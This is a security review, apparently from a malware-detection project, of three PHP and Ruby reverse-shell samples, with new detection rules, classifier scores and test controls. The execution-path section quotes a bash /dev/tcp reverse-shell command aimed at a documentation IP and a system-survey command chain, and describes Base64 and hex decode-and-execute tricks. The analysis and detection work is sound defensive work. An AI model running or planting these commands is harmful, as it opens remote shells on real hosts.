# Inline PHP and Ruby shell-stage review

All three originals are **MALICIOUS** on the supplied standalone evidence.
They are short reverse-shell payloads, not identifiable registry packages or
known malware families. No package name, version, manifest, publication record,
authorization, or enclosing test harness was supplied. The documentation address
`192.0.2.123` suggests a demonstration or sanitized payload and prevents treating
the endpoint as an operational C2 indicator. It does not make the executed shell
commands inert. Authorized testing remains a possible deployment context.

## Execution paths

* `9258759045d0`: PHP calls `system` twice at top level. The first call feeds an
  inline Base64 literal through `openssl enc -base64 -d -A` into `sh`, yielding
  `id; whoami; hostname; uname -a; cat /etc/os-release`. The second invokes
  `bash -c` with an interactive Bash shell whose stdout/stderr connect to
  `/dev/tcp/192.0.2.123/4444`, then duplicates that socket descriptor onto stdin.
* `1f7bc18d830c`: Ruby calls `Kernel.system` with one string containing a pipeline.
  `echo` feeds hexadecimal bytes to `xxd -r -p`, whose output is Bash source:
  `bash -i >& /dev/tcp/192.0.2.123/4444 0>&1`. The last pipeline process is Bash,
  so the decoded source is interpreted rather than merely printed or saved.
* `b3161a51f7f7`: the same PHP survey is followed by a `system` call containing
  the reverse-shell command directly. Its outer system shell must understand
  Bash redirection and `/dev/tcp`; a non-Bash `/bin/sh` can reject the redirection.
  The first PHP version explicitly delegates that parsing to Bash.

Both decodings were independently verified using the installed OpenSSL and xxd
tools, with their output captured as data. Ruby's top-level dispatch was replayed
with `Kernel.system` replaced by a recording stub. `/bin/sh -n` and `/bin/bash -n`
accepted the decoded reverse-shell source on the analysis host; neither was used
to execute it. PHP was traced from its parsed call/argument and flow facts; no PHP
runtime was installed. Network contact and successful remote control were not
observed. `cleave facts` reported no archive members or further payloads.

The survey inherits the caller's output stream. There is no evidence that its
output is sent through the later reverse shell, and no basis for adding theft,
persistence, privilege escalation, filesystem staging, or cleanup claims.

## Detection changes

Three new YAML rules add a notable observation of Ruby system commands invoking
the xxd decoder, a notable decoded Unix survey command chain, and a hostile
survey-with-reverse-shell composite. The last explicitly describes co-occurrence,
not source-to-socket data flow. Existing Base64 decoding and both shell pipeline
observations already cover those operations; duplicating OpenSSL-specific
coverage would add no distinct behavior here. Existing reverse-shell,
obfuscation, encoding, identity, OS, file-read, and descriptor findings were kept
with their original severities. No shared rule was removed, narrowed or demoted.

| Original SHA-256 prefix | Hostile before/after | Suspicious before/after | ML probability before/after | ML level before/after |
|---|---|---|---|---|
| 9258759045d0 | 2 / 3 | 2 / 2 | 0.99981225 / 0.99963444 | 0 / 0 |
| 1f7bc18d830c | 2 / 2 | 4 / 4 | 0.9805085 / 0.99088854 | 1 / 1 |
| b3161a51f7f7 | 2 / 3 | 2 / 2 | 0.99984455 / 0.9996914 | 0 / 0 |

Atomscan continues flagging every sample; there are no lost traits, severity
changes, or remaining sample-level classifier disagreements. The installed model
reports feature schema v18 against engine schema v21, so new features cannot be
assumed to influence every model route. Exact comparisons are in `review.json`.

Ruby remains below the 3–5 hostile-trait goal. Its complete code contains one
reverse-shell payload plus hex concealment and a decoding/execution pipeline.
Both existing hostile findings describe that shell; concealment remains
suspicious, and the newly recovered decoder operation is notable. Decoded bytes
and the intercepted call reveal no other hostile behavior to detect. No observed
behavior remains uncovered; the evidence does not support a third distinct
hostile claim.

## Controls and consumers

Run `python3 testdata/inline-shell-stage-review/check.py`. Its 16 static controls
cover PHP and Ruby survey/shell combinations, both encoded schemes, unused
survey data, clear diagnostics, xxd decoding data into a file or cat, explicit
`Kernel.system`, unrelated receivers, multiple argv arguments, comments,
quoted examples, and printing a quoted pipeline. The checker copies controls
outside a test-directory path because existing encoded-shell rules intentionally
exclude those paths. The controls are scanned, never executed.

The existing `testdata/bash-env-ci/verify.py` controls and
`testdata/taxonomy/encoded-url-capabilities/check.py` controls also passed,
preserving shell/AppleScript decoder and OpenSSL positives and near misses.
Ancestor selectors were inspected: the new Ruby hex atom can contribute only to
the encoding-related source profile (component); the other hex consumer is
JavaScript-scoped. Broad sysinfo/discovery consumers retain their independent
credential/network/other evidence requirements. The direct profiled-dispatch
consumer is JavaScript/TypeScript-scoped, outside the new PHP/Ruby objective.
No consumer was changed or gained an additional finding on the three originals.
